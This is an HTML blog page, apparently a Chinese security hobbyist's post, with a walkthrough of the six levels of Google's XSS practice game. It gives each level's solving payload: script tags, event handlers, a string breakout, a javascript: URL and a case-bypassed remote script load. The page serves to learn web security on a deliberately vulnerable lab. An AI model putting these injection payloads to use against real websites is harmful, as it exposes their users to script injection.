@@ -1,0 +1,537 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Hind:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":true,"scrollpercent":false},"bookmark":{"enable":true,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":true,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="地址：https:&#x2F;&#x2F;xss-game.appspot.com&#x2F;level2">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Google-XSS-game">
+<meta property="og:url" content="http://example.com/2019/06/17/google-xss/index.html">
+<meta property="og:site_name" content="fxxy">
+<meta property="og:description" content="地址：https:&#x2F;&#x2F;xss-game.appspot.com&#x2F;level2">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/image-20200702162525098.png">
+<meta property="og:image" content="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/image-20200702163502905.png">
+<meta property="article:published_time" content="2019-06-16T16:00:00.000Z">
+<meta property="article:modified_time" content="2021-10-22T08:30:40.730Z">
+<meta property="article:author" content="fxxy">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/image-20200702162525098.png">
+
+<link rel="canonical" href="http://example.com/2019/06/17/google-xss/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>Google-XSS-game | fxxy</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="fxxy" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">fxxy</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">7</span></a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">19</span></a>
+
+  </li>
+        <li class="menu-item menu-item-友链">
+
+    <a href="/link/" rel="section"><i class="fa fa-link fa-fw"></i>友链</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2019/06/17/google-xss/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/logo.png">
+      <meta itemprop="name" content="fxxy">
+      <meta itemprop="description" content="力争下游。">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="fxxy">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Google-XSS-game
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2019-06-17 00:00:00" itemprop="dateCreated datePublished" datetime="2019-06-17T00:00:00+08:00">2019-06-17</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-10-22 16:30:40" itemprop="dateModified" datetime="2021-10-22T16:30:40+08:00">2021-10-22</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id=""><a href="#" class="headerlink" title=""></a></h1><p>地址：<a target="_blank" rel="noopener" href="https://xss-game.appspot.com/level2">https://xss-game.appspot.com/level2</a><span id="more"></span></p>
+<h2 id="01"><a href="#01" class="headerlink" title="01"></a>01</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="02"><a href="#02" class="headerlink" title="02"></a>02</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=x onclick=alert(1)&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="03"><a href="#03" class="headerlink" title="03"></a>03</h2><p>代码</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">chooseTab</span>(<span class="params">num</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// Dynamically load the appropriate image.</span></span><br><span class="line">  <span class="keyword">var</span> html = <span class="string">&quot;Image &quot;</span> + <span class="built_in">parseInt</span>(num) + <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">  html += <span class="string">&quot;&lt;img src=&#x27;/static/level3/cloud&quot;</span> + num + <span class="string">&quot;.jpg&#x27; /&gt;&quot;</span>;</span><br><span class="line">  $(<span class="string">&#x27;#tabContent&#x27;</span>).html(html);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">window</span>.location.hash = num;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Select the current tab</span></span><br><span class="line">  <span class="keyword">var</span> tabs = <span class="built_in">document</span>.querySelectorAll(<span class="string">&#x27;.tab&#x27;</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; tabs.length; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (tabs[i].id == <span class="string">&quot;tab&quot;</span> + <span class="built_in">parseInt</span>(num)) &#123;</span><br><span class="line">      tabs[i].className = <span class="string">&quot;tab active&quot;</span>;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      tabs[i].className = <span class="string">&quot;tab&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Tell parent we&#x27;ve changed the tab</span></span><br><span class="line">  top.postMessage(self.location.toString(), <span class="string">&quot;*&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">window</span>.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">  chooseTab(<span class="built_in">unescape</span>(self.location.hash.substr(<span class="number">1</span>)) || <span class="string">&quot;1&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Extra code so that we can communicate with the parent page</span></span><br><span class="line"><span class="built_in">window</span>.addEventListener(<span class="string">&quot;message&quot;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">event</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (event.source == parent) &#123;</span><br><span class="line">    chooseTab(<span class="built_in">unescape</span>(self.location.hash.substr(<span class="number">1</span>)));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;, <span class="literal">false</span>);</span><br></pre></td></tr></table></figure>
+
+<p>html中关键点</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;/static/level3/cloud3.jpg&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>分析</p>
+<ul>
+<li>self.location.hash ：获取URL#号后面的内容</li>
+<li>unescape()：不用url解码</li>
+<li>chooseTab()：将#后面输入的图片编码加入img标签中</li>
+</ul>
+<p>清晰了利用点，就是#后面的内容会被拼接到html中</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://xss-game.appspot.com/level3/frame#3&#x27; onclick=&#x27;alert(1)&#x27;;</span><br></pre></td></tr></table></figure>
+
+<h2 id="04"><a href="#04" class="headerlink" title="04"></a>04</h2><p>输入的东西会拼接到这里</p>
+<p><img src="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/image-20200702162525098.png" alt="image-20200702162525098"></p>
+<p>payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;);alert(1);var x=(&#x27;</span><br></pre></td></tr></table></figure>
+
+<h2 id="05"><a href="#05" class="headerlink" title="05"></a>05</h2><p>next可控</p>
+<p><img src="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/image-20200702163502905.png" alt="image-20200702163502905"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">在url上输入：</span><br><span class="line">next=javascript:alert(1)</span><br></pre></td></tr></table></figure>
+
+<h2 id="06"><a href="#06" class="headerlink" title="06"></a>06</h2><p>url里#后面的内容会拼接到script标签的src中，但是过滤了http，而且必须使用https协议</p>
+<ul>
+<li>大小写绕过</li>
+<li>一种解法远程加载js代码</li>
+</ul>
+<p>googleAPI</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">htTps://www.google.com/jsapi?callback=alert</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>第二种解法：data:text,alert(1)</li>
+</ul>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2018/12/18/JavaScript%E6%9C%AC%E5%9C%B0%E5%AD%98%E5%82%A8/" rel="prev" title="JavaScript实现web浏览器本地存储">
+      <i class="fa fa-chevron-left"></i> JavaScript实现web浏览器本地存储
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2019/06/20/windows%E4%B8%8Bvscode%E9%85%8D%E7%BD%AEphp%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95/" rel="next" title="Windows下vscode配置PHP动态调试环境">
+      Windows下vscode配置PHP动态调试环境 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-number">1.</span> <span class="nav-text"></span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#01"><span class="nav-number">1.1.</span> <span class="nav-text">01</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#02"><span class="nav-number">1.2.</span> <span class="nav-text">02</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#03"><span class="nav-number">1.3.</span> <span class="nav-text">03</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#04"><span class="nav-number">1.4.</span> <span class="nav-text">04</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#05"><span class="nav-number">1.5.</span> <span class="nav-text">05</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#06"><span class="nav-number">1.6.</span> <span class="nav-text">06</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="fxxy"
+      src="/images/logo.png">
+  <p class="site-author-name" itemprop="name">fxxy</p>
+  <div class="site-description" itemprop="description">力争下游。</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">19</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/fxxy-xx" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;fxxy-xx" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i></a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:2420225660@qq.com" title="E-Mail → mailto:2420225660@qq.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i></a>
+      </span>
+  </div>
+
+
+
+      </div>
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">fxxy</span>
+</div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script size="300" alpha="0.6" zIndex="-1" src="/lib/canvas-ribbon/canvas-ribbon.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/pjax/pjax.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+<script src="/js/bookmark.js"></script>
+
+  <script>
+var pjax = new Pjax({
+  selectors: [
+    'head title',
+    '#page-configurations',
+    '.content-wrap',
+    '.post-toc-wrap',
+    '.languages',
+    '#pjax'
+  ],
+  switches: {
+    '.post-toc-wrap': Pjax.switches.innerHTML
+  },
+  analytics: false,
+  cacheBust: false,
+  scrollTo : !CONFIG.bookmark.enable
+});
+
+window.addEventListener('pjax:success', () => {
+  document.querySelectorAll('script[data-pjax], script#page-configurations, #pjax script').forEach(element => {
+    var code = element.text || element.textContent || element.innerHTML || '';
+    var parent = element.parentNode;
+    parent.removeChild(element);
+    var script = document.createElement('script');
+    if (element.id) {
+      script.id = element.id;
+    }
+    if (element.className) {
+      script.className = element.className;
+    }
+    if (element.type) {
+      script.type = element.type;
+    }
+    if (element.src) {
+      script.src = element.src;
+      // Force synchronous loading of peripheral JS.
+      script.async = false;
+    }
+    if (element.dataset.pjax !== undefined) {
+      script.dataset.pjax = '';
+    }
+    if (code !== '') {
+      script.appendChild(document.createTextNode(code));
+    }
+    parent.appendChild(script);
+  });
+  NexT.boot.refresh();
+  // Define Motion Sequence & Bootstrap Motion.
+  if (CONFIG.motion.enable) {
+    NexT.motion.integrator
+      .init()
+      .add(NexT.motion.middleWares.subMenu)
+      .add(NexT.motion.middleWares.postList)
+      .bootstrap();
+  }
+  NexT.utils.updateSidebarPosition();
+});
+</script>
+
+
+  <script defer src="/lib/three/three.min.js"></script>
+    <script defer src="/lib/three/three-waves.min.js"></script>
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+<script data-pjax>
+if (document.querySelectorAll('pre.mermaid').length) {
+  NexT.utils.getScript('//cdn.jsdelivr.net/npm/mermaid@8/dist/mermaid.min.js', () => {
+    mermaid.initialize({
+      theme    : 'dark',
+      logLevel : 3,
+      flowchart: { curve     : 'linear' },
+      gantt    : { axisFormat: '%m/%d/%Y' },
+      sequence : { actorMargin: 50 }
+    });
+  }, window.mermaid);
+}
+</script>
+
+
+    <div id="pjax">
+  
+
+  
+
+    </div>
+</body>
+</html>
